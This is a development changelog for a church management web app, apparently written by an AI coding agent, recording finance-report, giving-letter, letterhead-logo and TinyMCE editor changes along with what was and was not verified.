- The two nearly-identical year-end/mid-year batch-send code paths were consolidated into shared `loadBatchGivers(prefix, letterType)`/`sendBatchGivers(prefix, yr, letterType)`/`doSendGivingBatch(yr, letterType, checks, status, dailyCap)` functions parameterized by DOM-id prefix (`batch-stmt`/`batch-mid`) and letter type — `loadBatchStatementGivers()`/`loadBatchMidyearGivers()` (the two names `html-tabs.js`'s "Load Givers" buttons actually call) are now thin wrappers, so no HTML changes were needed beyond what already existed. Rebasing onto main landed in the middle of an unrelated parallel branch that had added a whole new "Batch Send — Giving Appeal" (all member households, not just existing givers) feature in the same file, plus reworked `letterheadImgHtml()`'s signature — resolved by keeping the Appeal feature exactly as-is (not yet extended with this same resume/dedup/rate-limit handling — a natural follow-up, not done here) and updating my own code to call the new `letterheadImgHtml()` signature.
- **Verified against the actual built code** with a Node harness simulating the real async `api()` flow, re-run again after the rebase/merge: confirmed a rate-limited response on send #3 of 5 stops the loop with 0 further attempts (persons 4 and 5 never even get a giving-statement lookup, let alone a send call), and separately confirmed a `dailyCap` of 3 stops after exactly 3 sends leaving 2 pending — both with the exact user-facing status message. `npm test` (241/241, no test changes — this is all DOM/async-callback code with no Node-testable surface beyond what the harness covers directly). `node --check` on both built script bundles, all touched backend files, and the worker entry point.
- **Not verified**: an actual browser, or a real Resend account hitting its real daily limit — the `rate_limited` detection is based on Resend's documented 429 status plus a text-sniff fallback for other quota-related error shapes, not something reproducible without a live account at its cap.
(`migrations/0027_giving_letter_sends.sql`, `src/db.js`, `src/api-import.js`, `src/api-reports.js`, `src/frontend/js-reports.js`, `src/frontend/js-export-import.js`, `src/frontend/js-core.js`)

### 2026-07-23 (v1.66.0 — Letterhead logo shows alongside the church name, not instead of it)
Immediate follow-up: v1.65.0's `letterheadImgHtml() || <church-name-div>` pattern meant an uploaded logo replaced the name text entirely — user wanted both shown together, logo above the name, left-aligned (the `<img>`'s own `margin:0 auto` was centering it regardless of the surrounding text alignment). Changed all 7 call sites from `||` (image OR text) to string concatenation (image THEN text, image contributing `''` when unset so the no-logo path is byte-identical to before); `letterheadImgHtml()` itself dropped `margin:0 auto`/`display:block` centering in favor of a plain left-aligned `margin:0 0 8px`, and the 2 call sites that wrapped the whole header in `text-align:center` (the person/household statement views) had that removed too. `npm test` (236/236), `node --check` on both built bundles, and a harness re-confirming both the combined logo+name output and the byte-identical no-logo fallback against the actual built code. Not verified in a live browser. (`src/frontend/js-reports.js`, `src/frontend/js-export-import.js`, `src/frontend/js-settings.js`, `src/frontend/js-core.js`)

### 2026-07-23 (v1.65.0 — Letterhead logo on giving letters)
Follow-up to the TinyMCE work above: the plain "Timothy Lutheran Church" text shown above every giving letter (statement view, letter view/print, single-send email, both batch-send emails, and the Settings preview modal) isn't part of the TinyMCE-edited template body — it's a separate hardcoded header rendered by 7 near-identical call sites across `js-reports.js`/`js-export-import.js`/`js-settings.js`, driven by `_churchConfig.church_name`. User asked to replace it with their logo.
- New Settings → Church Information → "Letterhead Logo" upload control (file input + thumbnail preview + Remove button), uploading immediately on file select rather than waiting for "Save Church Info".
- **Storage/serving is deliberately NOT the same as the TinyMCE editor's base64-in-template approach** — a real, R2-backed file. Reused the existing `validateImageUpload()` helper (now exported from `src/api-people.js`, same magic-byte validation as person/household photo uploads) via new `GET`/`POST`/`DELETE /admin/api/config/letterhead-logo` (`src/api-import.js`, POST/DELETE gated `isStaff`), stored at a fixed R2 key `branding/letterhead-logo.<ext>` (only one ever exists; re-uploading a different format deletes the stale one). The extension is tracked in `chms_config.letterhead_logo_ext`, added to `config/church`'s GET-only `publicKeys` (deliberately **not** the PUT `allowed` list) so it can only be set via the dedicated upload endpoint, not the generic settings-save PUT, while still being picked up for free everywhere `_churchConfig` is already loaded.
- **Why not base64 like the TinyMCE images**: this asset needs to render reliably inside an actual sent HTML email across real-world mail clients, several of which (Outlook desktop notably) strip or block inline `data:` image sources for security reasons — a real logo needs a normal fetchable URL. New unauthenticated `GET /admin/letterhead-logo` route (`tlc-volunteer-worker.js`) serves it — deliberately without the auth check `/admin/r2photo/` has, since an email client can't send a session cookie along with an image request; it's just a logo, no sensitive data, so the missing auth is intentional.
- New shared `letterheadImgHtml(absolute, maxHeight)` (`src/frontend/js-reports.js`) returns an `<img>` tag when a logo is set, or `''` when not — every one of the 7 header call sites now does `letterheadImgHtml(false) || <its own original text-only div>`, so nothing changes in appearance or markup for anyone who hasn't uploaded a logo, and each site's original email-safe vs. in-app styling is preserved rather than consolidated into one risk of a shared template. The 3 email-bound call sites (single-send + both batch-sends) pass `absolute=true` to get a full `https://connect.timothystl.org/...` URL, since a relative path can't resolve inside an email client; the 4 on-screen call sites (both statement views, the letter view, and the Settings preview modal) use a plain relative path.
- `npm test` (236/236, no test changes — this only touches DOM-rendering string-building functions with no Node-testable surface beyond `letterheadImgHtml` itself, which was verified via a one-off Node harness against the actual built code, confirming both the empty-string no-logo case and the relative-vs-absolute URL split). `node --check` on both built script bundles, the worker entry point, and both touched backend files.
- **Not verified**: an actual browser (upload flow, thumbnail preview, and how the image actually renders inside a real sent email) — same standing caveat as the rest of this app's recent Finance/TinyMCE work, no browser or live Resend send available in this environment.
(`src/api-people.js`, `src/api-import.js`, `tlc-volunteer-worker.js`, `src/frontend/js-reports.js`, `src/frontend/js-export-import.js`, `src/frontend/js-settings.js`, `src/frontend/html-tabs.js`, `src/frontend/js-core.js`)

### 2026-07-23 (v1.64.0 — Self-hosted TinyMCE for the giving letter templates)
User asked for the Year-End/Mid-Year giving letter template `<textarea>`s in Settings to become rich-text (TinyMCE), for formatting and embedded images (church logo, four-values graphic), while keeping `{{name}}`/`{{#if_ein}}...{{/if_ein}}`-style merge tokens working.
- **Hosting**: self-hosted per the user's explicit choice (not TinyMCE Cloud), since the app's CSP (`src/auth.js`) is `script-src 'self' 'unsafe-inline'` with no third-party origins allowed — self-hosting needs zero CSP change and no tiny.cloud API key. Vendored a hand-picked minimal subset of the `tinymce` npm package (v7, GPL v2+) into `vendor/tinymce/` — core + model + silver theme + default icons + oxide skin + `lists`/`image`/`link`/`code` plugins only, ~1.3MB, not the full ~12MB package. New `/admin/vendor/tinymce/*` Worker route (`tlc-volunteer-worker.js`) proxies these files from `raw.githubusercontent.com` same-origin, mirroring the existing `/icons/` proxy pattern exactly — so it's genuinely same-origin from the browser's perspective and needs no CSP loosening.
- **Merge-token corruption risk** (a rich-text editor can silently split `{{name}}` across formatting tags if a user bolds half the word) — solved with atomic, non-editable "chip" spans (`contenteditable="false"`, `data-mce-token="{{name}}"`) inserted via a new "Insert Merge Field" toolbar dropdown (`mceTokenChip()`/`initLetterEditor()`, `src/frontend/js-settings.js`) rather than typed as plain text — a browser can't partially select into a `contenteditable="false"` element, so the token can only be inserted or deleted as a whole unit. `renderLetterHTML()` (`src/frontend/js-reports.js`) gained one line unwrapping these chips back to literal `{{token}}` text before its existing substitution regexes run — verified against the real built `renderLetterHTML` with a Node harness simulating actual TinyMCE chip markup, confirming both plain tokens and the `{{#if_ein}}...{{/if_ein}}` conditional resolve correctly.
- **Images**: no new upload endpoint — TinyMCE's `file_picker_callback` reads a locally-picked image and embeds it as a base64 `data:` URI directly in the stored template, which `img-src * data:` already allows. Fine for a logo-sized image; a very large embedded image would bloat both the stored config row and every sent email, but no hard size limit was added (kept the diff scoped to "just the editor" per the user's explicit instruction).
- Editor is lazy-loaded (`ensureTinyMCE()`) only when Settings is opened, not on every page load. `saveSettings()`/`previewLetterTemplate()`/`resetLetterTemplate()` all updated to sync TinyMCE's content into the underlying `<textarea>` first (TinyMCE only writes back to the original element on an explicit `.save()`, and this SPA has no native form submit to trigger that automatically).
- `npm test` (236/236 — no new automated tests added, since the corruption-risk verification was done via a one-off Node harness against the built code rather than a checked-in test; the existing `renderLetterHTML` test coverage is unaffected since the new unwrap step is a no-op on every template without chip spans), `node .github/scripts/check-built-scripts.js` (all 3 built `<script>` blocks parse cleanly), `node --check` on `tlc-volunteer-worker.js`. **Not verified in a live browser** — TinyMCE's non-editable-chip behavior, the file-picker image embed, and the editor-to-textarea sync are standard, well-documented TinyMCE behaviors, but there is no browser in this environment to click through them.
(`vendor/tinymce/` [new], `tlc-volunteer-worker.js`, `src/frontend/js-settings.js`, `src/frontend/js-reports.js`, `src/frontend/html-tabs.js`, `src/frontend/js-core.js`)

### 2026-07-23 (v1.63.0 — Monthly P&L Excel importer, unblocking Overview's trend/projection cards)
Follow-up to v1.62.2's gap explanation: with live QuickBooks OAuth sync still pending approval (FIN2), the user asked to proceed with the Excel-import path instead of waiting. Added a second, genuinely different Church Report import: a "Profit and Loss by Month" QuickBooks export has one column per month instead of the annual "Budget vs. Actuals" report's Actual/Budget pair, so it needs its own sheet-finder/parser (`findMonthlyPnLSheet`/`parseMonthlyPnLGrid`) — reuses the exact same leading-space-indentation tree walk and classification normalization as the existing `parseBudgetVsActualsGrid` (same report family/export convention from this church's QuickBooks), only the header detection and per-row amount extraction differ (N month columns instead of 2, budget always null — matching the live monthly sync's own `makeMonthlyExtractor` shape). New "Import Monthly P&L" button next to the existing Budget/Balance Sheet import buttons on the Church Report card opens a preview-then-commit modal (same UX pattern as the other two imports): parses server-side, shows a month-by-month table for review, commits on confirm. New `persistChurchEntriesMonthlyImport()` wholesale-replaces a fiscal year's `source='monthly_import'` rows (all 12 months at once) on re-import, same replace-per-year pattern as the annual import. New `resolveChurchMonthlyYearPrecedence()` (`CHURCH_MONTHLY_SOURCE_PRIORITY = ['qbo_sync', 'monthly_import']`) resolves per-fiscal-year precedence the same way the annual `resolveChurchYearPrecedence` does — a live sync always wins over this import for the same year, but this import fills in years the live sync has never touched. The `finance/church/this-year` handler's monthly-rows query now reads `source IN ('qbo_sync','monthly_import')` and pipes through the new resolver before feeding `computeYtdComparison`/`computeSuppliesMonthlyBreakdown`/`computeIncomeExpenseMonthlyTrend` — so once a year's monthly P&L is imported, the Overview's Income vs. Expenses trend, Year-End Projection, YTD-vs-last-year comparison, and Supplies chart all populate from it exactly as they would from a live sync.
- `npm test` (234/234, 11 new tests in `test/finance-church-monthly-import.test.js` covering sheet detection, header/fiscal-year extraction, per-account-per-month row shape and depth/classification, Total/running-subtotal-row skipping, persist + re-import replace, and qbo_sync-over-monthly_import precedence with cross-year fallback), `node .github/scripts/check-built-scripts.js` (all 3 built `<script>` blocks parse cleanly). **Not verified in a live browser** — same standing caveat as the rest of Finance/Church Report this session.
(`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/html-tabs.js`, `src/frontend/js-core.js`, `test/finance-church-monthly-import.test.js`)

### 2026-07-23 (v1.62.2 — Daycare MDO import moved to its own tab; Overview trend-chart gap explained)
Two follow-ups from the same conversation, prompted by a real screenshot each time. (1) The "Import from Church Budget (MDO accounts)" control lived on the Overview tab's Daycare Sync card, one tab away from the Daycare Report table it actually feeds (now the report's single source of truth per v1.62.1) — easy to miss, which is exactly what happened. Moved the whole card (year input, Preview, commit button, preview table) onto the Daycare Report tab itself, directly above the report table. Also fixed a real pre-existing gap surfaced by the move: `finDaycareChurchBudgetImport()`'s success handler only ever refreshed the Overview's raw synced-line-items list (`finRenderDaycare()`) — never the Daycare Report table or the Overview's Daycare domain view — so even before this move, a successful import wouldn't visibly update anything on the page the user was actually looking at. Now also calls `finRenderDaycareReport()` and (if active) `finRenderOverviewDaycare()`. (2) Explained why the Overview's "Income vs. Expenses" trend and "Year-End Projection" cards show "Not yet available": they need month-by-month QuickBooks data (`period_month` 1-12), which only the live OAuth sync writes — the manual "Import Budget" Excel tool the user has been using is annual-only (`period_month=0`), and per FIN2 the live sync itself has been blocked by an Intuit "5020 Permission Denied" error. Offered two paths (retry the live sync now / build a "Profit and Loss by Month" Excel importer) — not built yet, awaiting the user's choice.
- `npm test` (223/223, no test changes — pure UI relocation + one bugfix in existing glue code), `node --check` on both built app-JS bundles, div-balance check on the built `CHMS_HTML`. **Not verified in a live browser.**
(`src/frontend/html-tabs.js`, `src/frontend/js-finance.js`, `src/frontend/js-core.js`)

### 2026-07-23 (v1.62.1 — Daycare Report: single source of truth — church Budget import only)
Follow-up: asked where the Daycare Report's numbers actually come from. Answer given: Actual/Budget were a blind SUM across every source with data for that (year, category) — `church_budget_import`, `daycare_api` (the daycare app's own sync), and one-off `manual` entries — with no way to tell which contributed, and a real risk of double-counting if more than one had data for the same cell. User's decision: **only one source — the church Budget import is fine.**
- `finAggregateDaycareByYear()` now only counts `source='church_budget_import'` (plus `manual_budget_override`, the per-cell Budget edit from v1.61.1) — new `FIN_DAYCARE_COUNTED_SOURCES` allowlist. `daycare_api` and plain `manual` rows are excluded from every total: not deleted, just no longer counted, so the two can never silently sum together again.
- New `finDaycareOtherSourceTotals()` scans for any excluded-source data that still exists per year and a new warning banner surfaces it at the top of the Daycare Report ("there's daycare-app-sync or manually-entered data... not included... see Overview → Daycare Sync → 'Show all synced line items' to review or remove it") — a deliberate choice not to silently hide old data the user might not know is sitting there unused.
- `npm test` (223/223, 4 new tests), `node --check` on both built app-JS bundles, div-balance check on the built `CHMS_HTML`. **Not verified in a live browser.**
(`src/frontend/js-finance.js`, `src/frontend/js-core.js`, `test/finance-daycare-aggregate.test.js`)

### 2026-07-23 (v1.61.1 — Daycare Report: corrected direct-edit model — Budget-only, per-cell)
Immediate follow-up after v1.61.0 shipped: the user clarified (with a screenshot) that the "enter everything by hand" panel was the wrong shape. The real ask: **Actual** should always come from the church's own budget import (already exists — "Import from Church Budget (MDO accounts)" in Overview → Daycare Sync), never be hand-typed; only a past year's **Budget** figure needs direct editing, since it may not be sitting in an imported church file, and it should be editable right in the existing Daycare Report table, not a separate form.
- Replaced `POST finance/daycare/year-entry` (which accepted Actual+Budget for a whole year at once, source `manual_year_entry`) with `POST finance/daycare/budget-override` — one (year, category) cell at a time, source `manual_budget_override`. Actual is never touched by this endpoint at all.
- **Aggregation precedence fix**: since `finAggregateDaycareByYear()` normally *sums* every entry for a (year, category), a manual override sitting alongside an existing church-import budget row for the same cell would have silently added rather than replaced. Fixed by holding back `manual_budget_override` rows into a separate pass that overwrites (not adds to) whatever was already summed for that exact cell — verified with a dedicated test asserting the override wins over, not on top of, the import figure.
- Frontend: removed the whole "Enter/Edit a Year's Budget Directly" panel/form; the Daycare Report's existing Budget cells are now directly clickable (admin-only) — click a figure, it becomes an input, Enter/blur saves via the new endpoint and refreshes. The two live-derived cells (Utilities/Insurance, from v1.61.0) are excluded from direct editing since their budget is always the allocation percentage plus any override applied through the same mechanism, not a plain typed number.
- `npm test` (219/219 — replaced the old year-entry test file with `finance-daycare-budget-override.test.js`, added `finance-daycare-aggregate.test.js` for the override-precedence logic), `node --check` on both built app-JS bundles, div-balance check on the built `CHMS_HTML`. **Not verified in a live browser** — this correction was itself prompted by a real phone screenshot showing the previous version wasn't behaving as expected, so treat this one particularly cautiously until confirmed live.
(`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/js-core.js`, `test/finance-daycare-budget-override.test.js`, `test/finance-daycare-aggregate.test.js`)

### 2026-07-23 (v1.61.0 — Daycare Report: direct year-entry fields + live Utilities/Insurance cost-share)
Two requests in one message, following up on the Finance Workspace redesign: (1) a way to directly enter 2025/2026 MDO budget numbers as editable fields in the Finance tab, and (2) new Utilities and Insurance daycare lines computed from a percentage of the church side's actual expense.
- **Utilities/Insurance cost-share** — confirmed with the user: 50% of the church's full Utilities actual and 50% of the church's full Insurance actual, recalculated live every time (never a stored dollar figure that can go stale). New `computeChurchCategoryActualCents(resolvedRows, matchRe)`/`computeMdoUtilityInsuranceAllocation(rowsByYear, utilityPct, insurancePct)` (`api-finance.js`) — matches on `category_path` (not just `account_name`), since the church's chart of accounts only tags the grouping label itself (e.g. "34 Utilities") while real postings live on child leaf accounts (Electric/Gas/Water/etc.) that don't contain the word "Utilities" in their own name at all. New `GET /admin/api/finance/daycare/allocation?years=...` computes this live from `finance_church_entries`; new `GET`/`PUT /admin/api/finance/daycare/allocation-config` (admin-only write) stores the two percentages (default 50%/50%) in `chms_config`. Frontend: `finAggregateDaycareByYear()` gained an optional `allocationByYear` param that merges "Utilities"/"Insurance" in as ordinary derived expense categories (labeled "(derived)" in the table, Budget column stays $0 since the allocation is actual-only per the user's own wording); a small editable "MDO Utilities/Insurance cost-share" panel above the Daycare Report table lets an admin change the percentages, which forces a fresh recompute.
- **Direct year-entry fields** — per the user's explicit ask ("make it fields I can edit in the finance tab"), new `POST /admin/api/finance/daycare/year-entry` (admin-only): one Actual/Budget number field per known category (Tuition Income/Payroll/Payroll Taxes/Workers Comp/Other Payroll Expenses/Other Expenses) for a chosen year, saved wholesale. Tagged `source='manual_year_entry'` and **replaces** (not appends) any prior direct entry for that exact year on every save — behaves like a real editable field (re-saving is idempotent) without disturbing rows from any other source (the daycare app's own sync, the church-budget MDO import, or a one-off row added via the pre-existing single-entry form). New "+ Enter/Edit a Year's Budget Directly" panel in the Daycare Report, pre-filling from whatever `manual_year_entry` rows already exist for the chosen year.
- `npm test` (213/213, 15 new tests covering the allocation math, the endpoint's admin gating, and the replace-not-append save semantics), `node --check` on both built app-JS bundles, and a targeted open/close tag check on the new dynamically-generated markup (caught and fixed one more instance of the SC3-BUG1 backtick-in-comment class before it shipped — a stray backtick in a new comment, found via the same extract-and-check technique documented elsewhere in this file). **Not verified in a live browser.**
(`src/api-finance.js`, `src/frontend/js-finance.js`, `src/frontend/js-core.js`, `test/finance-daycare-allocation.test.js`, `test/finance-daycare-year-entry.test.js`)

### 2026-07-22 (v1.60.0 — Finance Workspace redesign, Phase 5: Compensation split into its own tab)
Fifth and final planned phase of the Finance Workspace redesign (see FIN27 in CLAUDE.md). Splits the Salary Calculator and Health Insurance cards out of Planning into a new "Compensation" sub-nav tab, restyles their outer containers, and adds the new Concordia Decision Support reference block requested alongside the redesign.
- New "Compensation" entry in `FIN_TOPNAV_ITEMS` (`js-core.js`) and `fin-panel-compensation` panel (`html-tabs.js`) with its own `#fin-comp-root` mount. `finRenderPlanning()` no longer appends the two calculators — a new `finRenderCompensation()` renders them into the new panel instead, sharing the same `_finPlanBaseTree`/`_finSalaryRoster`/`_finPlanTargetYear` state Planning already loads (no duplicate fetch — both renderers are called together from `finLoadPlanning()`).
- `finRerenderPlanningPreserveFocus()` (the focus/scroll-preserving re-render helper from FIN20, used by every roster field-change handler) now re-renders `finRenderCompensation()` instead of `finRenderPlanning()`, since all its callers are Salary/Health Insurance field handlers that now live in the new panel. The two "Apply to Plan" buttons (which write into `_finPlanEdits`, consumed by Planning's own table) now also call `finRenderPlanning()` explicitly, so a figure applied from Compensation shows up in Planning's Projected column immediately, even while Compensation is the visible panel.
- Both calculators' outer containers restyled from a plain `background:var(--linen)` box to the shared `.fin-card` component from Phase 1. **Real LCMS/Concordia math is completely unchanged** — this was a rendering-target and container-style change only, confirmed by the fact that `test/finance-salary-calculator.test.js` (which extracts and unit-tests the underlying pure compute functions directly from the built script) needed zero changes and still passes.
- **New: Concordia Decision Support estimate reference block**, per the user's real Compensation Decision Support Tool PDF for Rev. Dinger (Pastor-Senior Administrative, 20 yrs, Masters, run 2026-07-21) — a manually-run report per worker, not an API, giving 4 ranges (Church Market / Church LCMS / District Market / District, each Low/Mid/High) plus Position/Years/Education/Report-Date metadata. Added as `w.concordia` on the same roster row object — fully additive to the existing `finance_salary_planner` JSON blob (no migration needed, no schema validation on that field beyond "roster must be an array"), rendered as a collapsible per-worker `<details>` block below the roster table, persisted by the existing "Save Salary & Benefits Data" button. Deliberately does NOT trigger the focus-preserving re-render on every keystroke (unlike other roster fields) since nothing else depends on these values — avoids collapsing the `<details>` open-state on every character typed.
- The mockup's separate "District Guideline Calculator" panel (hypothetical Position/Years/Congregation-size inputs → a generic formula) was **not built as a second, parallel tool** — the real system already computes the LCMS guideline per actual roster row via the scenario-comparison table (FIN25), and building a redundant one-off calculator with a different, simplified formula would have re-introduced exactly the generic-vs-real-math conflict this whole redesign was scoped to avoid. Flagged here rather than silently dropped.
- `npm test` (198/198, no test changes needed), `node --check` on both built app-JS bundles, and a targeted open/close tag balance check on the new dynamically-generated Concordia block (details/table tags don't appear in the static served HTML since they're built client-side after data loads, so the usual whole-document div-balance check doesn't cover them — verified separately by extracting and counting tags within the `finRenderConcordiaEstimates` function body). **Not verified in a live browser.**
- **This completes FIN27's 5 planned phases.** RD1/RD2/RD4 (the broader app-wide palette consolidation flagged back in Phase 20) remain separately queued, unaffected by this redesign.
(`src/frontend/js-finance.js`, `src/frontend/js-core.js`, `src/frontend/html-tabs.js`)

### 2026-07-22 (v1.59.0 — Finance Workspace redesign, Phase 4: Planning tab restyle)
Fourth phase of the Finance Workspace redesign (see FIN27 in CLAUDE.md). Restyle + one new additive card — the budget builder's actual generate/save/commit logic and data model are untouched.
- Budget builder table: cream header band matching Church Report's Phase 2 treatment, columns reordered to match the handoff (Category / FY Budget / FY Actual / FY Plan / Δ%), a new **Δ%** column (`(Projected − Budget) / Budget`, terracotta above +4%, green below 0%, muted otherwise — the handoff's own spec), and the editable Plan input restyled with the shared `.fin-editable-input` class from Phase 1.
- New **"FY[target] Projected Net" navy card** to the right of the table (table + actions on the left, card on the right — the handoff's two-column layout), showing projected revenue/planned expenses/surplus-or-deficit, computed from the exact same `projectedRevenueCents`/`projectedExpenseCents` the table's own subtotal rows already use — can't disagree with the table above it.
- New **Three-Year Outlook** card (`finRenderPlanningOutlook()`) — target year + 3 forward years as a simple bar row (green surplus / terracotta deficit), income growing 2.5%/yr and expenses 3%/yr beyond the target year, per the handoff's own stated assumption (not independently derived — flagged as such in the card's caption). New unit tests lock in the compounding math.
- Salary Calculator and Health Insurance cards are unchanged in this phase — they're moving into their own Compensation tab in Phase 5, not being restyled in place here.
- `npm test` (198/198, 2 new tests), `node --check` on both built app-JS bundles, div-balance check on the built `CHMS_HTML`. **Not verified in a live browser.**
- **Next**: Compensation split out of Planning into its own tab, restyled, real LCMS/Concordia math unchanged, plus the new manual Concordia Decision Support reference block per worker.
(`src/frontend/js-finance.js`, `src/frontend/js-core.js`, `test/finance-planning-outlook.test.js`)

### 2026-07-22 (v1.58.0 — Finance Workspace redesign, Phase 3: Property tab restyle)
Third phase of the Finance Workspace redesign (see FIN27 in CLAUDE.md). Restyle + one genuinely new derived figure — no existing sub-view removed.
- New `finComputePropertyKpis(d)` / `finRenderKpiGrid(kpis)` — extracted from Phase 1's Overview-Property renderer so the same 4 figures (Occupancy / Monthly Net avg / Annual Net / Reserves On-Hand) back both the Overview tab's Property domain AND a new KPI row at the top of the Property tab itself, guaranteeing the two can never disagree.
- Existing Valuation/Mortgage/Equity/Loan-to-Value stat row kept (not removed), relabeled "Valuation & Equity" and placed below the new KPI grid as a second, more detailed row.
- **New "Available for Distribution" navy bar** (`finComputeAvailableForDistribution()`/`finRenderAvailableForDistributionBar()`) — directly from the design handoff's Property screen: this year's net income, minus reserve contributions and capital spend committed this year. A computed **estimate** for planning, explicitly captioned as distinct from "Distributions to Church" (the existing actual historical record) so the two aren't confused. New unit tests (`test/finance-property-distribution.test.js`) lock in the date-filtering (only current-year reserve/capital rows count) and the zero-data case.
- Property Tax Reserve section gained a small on-hand-vs-estimated-tax progress bar above its existing detailed schedule table (table itself unchanged).
- `npm test` (196/196, 2 new tests), `node --check` on both built app-JS bundles, div-balance check on the built `CHMS_HTML`. **Not verified in a live browser.**
- **Next**: Planning tab restyle (budget builder grid, 3-year outlook), then Compensation split out of Planning into its own tab.
(`src/frontend/js-finance.js`, `src/frontend/js-core.js`, `test/finance-property-distribution.test.js`)

### 2026-07-22 (v1.57.0 — Finance Workspace redesign, Phase 2: Church Report visual restyle)
Second phase of the Finance Workspace redesign (see FIN27 in CLAUDE.md, and the Phase 1 entry below). Restyle-only, per the user's decision — every existing sub-view (This Year/Multi-Year/Balance Sheet toggle, Supplies chart, YoY block, pie charts, Board Packet, CSV/xlsx import) is untouched in behavior; only the account-detail table and summary cards changed visually.
- `finChurchSummaryCard()` (the Total Revenue/Total Expenses/Net Income cards atop This Year view) now uses the `.fin-kpi-card`/`.fin-kpi-lbl`/`.fin-kpi-val`/`.fin-chip` classes from Phase 1 instead of ad hoc inline styles — colored top border by type (teal/gold/sage-or-danger), a status chip instead of plain text for the over/under-budget line.
- Full account-detail table (both This Year and Balance Sheet views): header row now uses the cream `--warm-surface-header` band with uppercase 11px labels (matching the handoff's Design Tokens table); each row's "Budget"/"Variance" columns replaced with a new `finVarianceCell()` — a small magnitude-vs-budget mini-bar + signed dollar figure, colored green/terracotta, **sign-aware per the handoff spec**: for Income/Other Income rows, actual ≥ budget is favorable; for Expense rows, actual ≤ budget is favorable (this direction actually matters — a naive "budget minus actual" coloring would have shown Income *shortfalls* as green).
- **Net Income row moved out of the table into its own component**: new `finRenderNetIncomeBar()` — a full-width navy bar below the table (green-on-navy for a surplus, matching the handoff's "navy full-width Net Income bar" footer treatment) instead of a plain double-bordered table row. `finRenderChurchDetailBody()` no longer renders a Net Income row at all — callers render the bar separately, right after the table, inside the same rounded card wrapper (table top-rounded, bar bottom-rounded, reads as one seamless card).
- Deleted `finMoneyClass()` (dead code — its only two call sites were both replaced by the new components above).
- Updated `test/finance-church-detail-body.test.js` for the new function shapes (added `finVarianceCell`/`finFmtSigned`/`finRenderNetIncomeBar` to the eval-extraction list per this file's established technique — see CLAUDE.md SC3-BUG1/TAP11/FIN10 — and split the old single "Net Income row is last" assertion into a dedicated `finRenderNetIncomeBar` test plus an explicit "the table body no longer contains a Net Income row" assertion).
- `npm test` (194/194, 2 new test cases), `node --check` on both built app-JS bundles, div-balance check on the built `CHMS_HTML`. **Not verified in a live browser.**
- **Next**: Property tab restyle (KPI/chart layout using the AHRA budget series from Phase 1), then Planning/Compensation split.
(`src/frontend/js-finance.js`, `src/frontend/js-core.js`, `test/finance-church-detail-body.test.js`)

### 2026-07-22 (v1.56.0 — Finance Workspace redesign, Phase 1: Overview dashboard rebuild)
Design-handoff-driven redesign of the Finance tab (5-section prototype: Overview/Church Report/Property/Planning/Compensation — see the handoff bundle), scoped with the user first since several places conflicted with real logic already built (FIN15-22's real LCMS/Concordia math vs. the mockup's generic formulas; the mockup's giving-fund `<select>` vs. this app having no such per-fund budget concept). Decisions: keep all real Compensation math (restyle only), restyle Church Report/Property while keeping every existing sub-view, split Compensation into its own tab eventually (queued), and resolve the mockup's fund selector into a **Church Operating / Daycare / Commercial Property domain switcher** instead of a giving fund (per user's own suggestion).
- **This slice: Overview tab only.** New KPI-card + "Are we on budget?" pace-panel + trend-chart + year-end-projection layout sits above the existing operational cards (QuickBooks Connection, Board Packet export, Daycare Sync forms — all untouched, unmoved in function, just relocated below a divider so they don't compete visually with the new dashboard).
- Church and Daycare domains get the full layout: 4 KPI cards (Net Position YTD / Income YTD / Expenses YTD / Projected Year-End), a click-to-drill-down expense-category pace panel (reuses the existing `finBuildTreeFromFlatRows`/`finReorganizeChurchTree` client-side tree builder — no new backend aggregation needed for Church), a 12-month Income vs. Expenses bar chart (actual solid, projected-remainder faded), and a Year-End Projection card. New backend `computeIncomeExpenseMonthlyTrend()` (`src/api-finance.js`) adds a `monthlyTrend` field to `GET /admin/api/finance/church/this-year` — actual months from synced monthly rows, remaining months a flat projection spreading what's left of the annual budget evenly (a deliberately simple placeholder matching the design handoff's own model — the smarter prior-year-ratio projection is what already backs the KPI/Year-End-Projection numbers via the existing `computeYtdComparison`).
- Property domain gets KPI cards + a Revenue vs. Expenses chart only (no pace panel — landlord actuals/reserves have no per-category budget to pace against, confirmed with the user rather than faked).
- **Property budget import**: the user provided a real AHRA "Budget Detail" export (`budget_detail20260126_2.xlsx`) — a genuinely different export shape from every QuickBooks-based import this app already reads (one row per account, monthly columns, but reusing the same generic `parseXlsxAllSheets()` reader). New `findPropertyBudgetDetailSheet()`/`parsePropertyBudgetDetailGrid()` read the export's own two rollup rows directly ("Total Budgeted Operating Income"/"...Expense" — present verbatim in the real file) rather than walking the whole account tree, since the Overview/Property chart only needs a monthly total. New `finance_property_budget_monthly` table (migration `0025`, parallels the existing actuals table `finance_property_monthly` but kept separate since the two come from different exports on different schedules) + `POST /admin/api/finance/property/ivanhoe/budget-import` (admin-only, parses and commits in one step — unlike the Church Report imports' preview-then-commit, this export's shape is fixed/unambiguous enough that a review step has little to catch). New file-upload control in the Property tab; once imported, both the Property tab's own chart data source and the Overview's Revenue vs. Expenses chart show 4 grouped bars (Revenue/Rev. Budget/Expenses/Exp. Budget) via the existing `renderGroupedBarChart` helper (already supports N series + null-skipping, confirmed before reuse).
- New CSS component classes (`.fin-kpi-*`, `.fin-chip-*`, `.fin-pace-*`, `.fin-navy-card`, `.fin-balance-*`, `.fin-trend-*`, `.fin-yearend-*`) added to `html-head.js` — cross-checked the design handoff's Design Tokens table hex-by-hex against existing brand tokens first; all but 6 values (sage-text, positive/negative-on-navy, 3 chip backgrounds) turned out to be exact existing matches (`--danger` *is* the handoff's terracotta, `--warm-surface-header` *is* its cream header row, etc.) — only those 6 were added as new tokens.
- Caught and fixed one instance of the SC3-BUG1/FIN15 bug class before it shipped: a code comment inside the outer `String.raw` template literal used literal backticks (`` `categories` ``), which would have prematurely closed the template and broken the whole served script. Caught by extracting and `node --check`-ing the built `<script>` content, per this file's own documented technique — not by inspection.
- `npm test` (193/193, 8 new tests: `computeIncomeExpenseMonthlyTrend`'s actual/projected split and non-negative-projection guard, `parsePropertyBudgetDetailGrid`'s AHRA-format extraction against a fixture matching the real uploaded file's structure), `node --check` on both built app-JS bundles, and a div-balance sanity check on the built `CHMS_HTML`. **Not verified in a live browser.**
